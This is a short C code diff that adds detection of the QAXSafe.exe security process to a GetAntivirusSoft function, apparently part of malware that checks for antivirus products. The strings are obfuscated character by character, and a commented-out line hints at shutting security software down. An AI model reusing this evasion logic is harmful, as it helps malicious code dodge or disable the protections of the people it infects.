@@ -459,6 +459,8 @@ int GetAntivirusSoft()
 
 	char szMsMpEng[] = { 'M','s','M','p','E','n','g','.','e','x','e',0 };	//MsMpEng.exe
 
+	char szQAXSafe[] = { 'Q','A','X','S','a','f','e','.','e','x','e',0 };
+
 	//get all the process on the computer,include client user and admin user
 	b360Running = GetProcessIdByName(sz360Tray) /*| GetProcessIdByName(sz360SecurityDefender) | GetProcessIdByName(sz360RealtimeProtect)*/;
 
@@ -503,6 +505,8 @@ int GetAntivirusSoft()
 	// 		lpWinExec(szNtsdShutdown,SW_HIDE);
 	// 	}
 
+
+	bQAXSafeRunning = GetProcessIdByName(szQAXSafe);
 	return TRUE;
 }
 
